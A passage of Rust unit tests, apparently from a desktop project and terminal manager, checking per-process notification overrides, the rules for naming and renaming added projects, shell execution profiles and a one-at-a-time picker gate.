        // Name with a space: project-file process keys are free-form strings.
        overrides.insert("watch build".to_owned(), level("all"));

        let dto = ProjectProcessDto::from_process(
            "server",
            &process_runtime("py app/server.py"),
            Some(&overrides),
        );
        assert_eq!(dto.notification_level.as_deref(), Some("none"));

        let dto = ProjectProcessDto::from_process(
            "watch build",
            &process_runtime("npm run dev"),
            Some(&overrides),
        );
        assert_eq!(dto.notification_level.as_deref(), Some("all"));

        // Not overridden → null (inherit), even though the map is non-empty.
        let dto = ProjectProcessDto::from_process(
            "summarize",
            &process_runtime("py app/summarize.py"),
            Some(&overrides),
        );
        assert_eq!(dto.notification_level, None);

        // No map at all (nothing ever overridden) → null too.
        let dto = ProjectProcessDto::from_process("summarize", &process_runtime("py x.py"), None);
        assert_eq!(dto.notification_level, None);
    }

    // ---- the add-project name rule --------------------------------

    /// Write a project root with a project file. `yml_name` = the file's own
    /// `name:` key (None writes a nameless yml, the common case).
    fn project_root(parent: &Path, folder: &str, yml_name: Option<&str>) -> PathBuf {
        let root = parent.join(folder);
        std::fs::create_dir_all(&root).unwrap();
        let mut text = String::new();
        if let Some(name) = yml_name {
            text.push_str(&format!("name: {name}\n"));
        }
        // A bare project file with one process — printable escapes only, never
        // a literal control byte in source.
        text.push_str("processes:\n  server:\n    command: py app/server.py\n");
        std::fs::write(root.join(project_model::yml::CHAPPA_YML_NAME), text).unwrap();
        root
    }

    /// An explicit name from the add modal is what gets PERSISTED — the whole
    /// point of the add modal ("the default is fine, the inability to change it is
    /// not").
    #[test]
    fn add_with_an_explicit_name_persists_that_name() {
        let dir = tempfile::tempdir().unwrap();
        let store_path = dir.path().join("projects.json");
        let mut store = ProjectStore::new(store_path.clone());
        let root = project_root(dir.path(), "chappa-ai", None);

        let p = add_to_store(
            &mut store,
            &root.display().to_string(),
            Some("notes companion".to_owned()),
        )
        .unwrap();
        assert_eq!(p.name, "notes companion");
        assert_eq!(
            ProjectStore::new(store_path).get(p.id).unwrap().name,
            "notes companion"
        );
    }

    /// Without an explicit name the derivation is EXACTLY the old one:
    /// the yml's `name`, else the folder basename. Boundary regime on the
    /// "explicit" side: None, empty and whitespace-only all mean "default".
    #[test]
    fn default_name_is_still_the_yml_name_then_the_folder_basename() {
        let dir = tempfile::tempdir().unwrap();
        let mut store = ProjectStore::new(dir.path().join("projects.json"));

        // No `name:` in the yml → the folder basename.
        let plain = project_root(dir.path(), "my-project", None);
        for (i, blank) in [None, Some(""), Some("   "), Some("\t"), Some("\n")]
            .into_iter()
            .enumerate()
        {
            let yml = ProjectYml::load(&plain).unwrap();
            let name = resolve_add_name(blank.map(str::to_owned), &yml, &plain).unwrap();
            assert_eq!(name, "my-project", "blank case {i}");
        }
        let p = add_to_store(&mut store, &plain.display().to_string(), None).unwrap();
        assert_eq!(p.name, "my-project");

        // A yml that names itself still wins over the folder basename.
        let named = project_root(dir.path(), "checkout-dir", Some("chappa-ai"));
        let q = add_to_store(&mut store, &named.display().to_string(), None).unwrap();
        assert_eq!(q.name, "chappa-ai");
        // …but an explicit name beats the yml name too.
        let third = project_root(dir.path(), "third", Some("from-yml"));
        let r = add_to_store(
            &mut store,
            &third.display().to_string(),
            Some("  spaced out  ".to_owned()),
        )
        .unwrap();
        assert_eq!(r.name, "spaced out", "explicit names are trimmed");
    }

    /// Re-adding an already-registered directory: an explicit (dirty) name
    /// that differs is applied as a RENAME of the stored row; `None` (the
    /// modal's untouched field) keeps today's return-existing-row behavior.
    #[test]
    fn re_add_renames_only_with_an_explicit_name() {
        let dir = tempfile::tempdir().unwrap();
        let store_path = dir.path().join("projects.json");
        let mut store = ProjectStore::new(store_path.clone());
        let root = project_root(dir.path(), "chappa-ai", None);
        let path = root.display().to_string();

        let first = add_to_store(&mut store, &path, Some("old name".to_owned())).unwrap();
        assert_eq!(first.name, "old name");

        // Untouched field (None) — the existing row comes back unrenamed.
        let same = add_to_store(&mut store, &path, None).unwrap();
        assert_eq!(same.id, first.id);
        assert_eq!(same.name, "old name");

        // Dirty explicit name — the stored row is renamed and persisted, and
        // the answer carries the NEW name (the frontend adopts it verbatim).
        let renamed = add_to_store(&mut store, &path, Some("new name".to_owned())).unwrap();
        assert_eq!(renamed.id, first.id);
        assert_eq!(renamed.name, "new name");
        assert_eq!(
            store.list().len(),
            1,
            "a rename must never duplicate the row"
        );
        assert_eq!(
            ProjectStore::new(store_path).get(first.id).unwrap().name,
            "new name"
        );

        // Re-typing the CURRENT name is a no-op, not an error.
        let unchanged = add_to_store(&mut store, &path, Some("new name".to_owned())).unwrap();
        assert_eq!(unchanged.name, "new name");
    }

    /// The enable toggle is scoped to the NEW-TERMINAL menu, as the settings
    /// pane documents — a disabled profile still runs project-file commands (
    /// review: the pane documented this while the runner refused disabled
    /// profiles).
    #[test]
    fn disabled_exec_profile_still_runs_project_file_commands() {
        let settings = settings_with("Off", vec![profile("Off", "bash.exe", false)]);
        let (program, args) = execution_command("make", &settings);
        assert_eq!(program, "bash.exe");
        assert_eq!(args, vec!["-c".to_owned(), "make".to_owned()]);
    }

    #[test]
    fn picker_gate_admits_one_picker_at_a_time() {
        let gate = PickerGate::new();
        let first = gate.claim().expect("gate starts open");
        assert!(
            gate.claim().is_none(),
            "a second picker is refused while one is up"
        );
        drop(first);
        let again = gate.claim();
        assert!(
            again.is_some(),
            "the slot frees itself when the first pick returns"
        );
        drop(again);
        // A pick that unwinds still releases the slot: the guard is a Drop.
        let unwound = std::panic::catch_unwind(|| {
            let _slot = gate.claim().expect("open again");
            panic!("picker thread died");
        });
        assert!(unwound.is_err());
        assert!(gate.claim().is_some());
    }
}
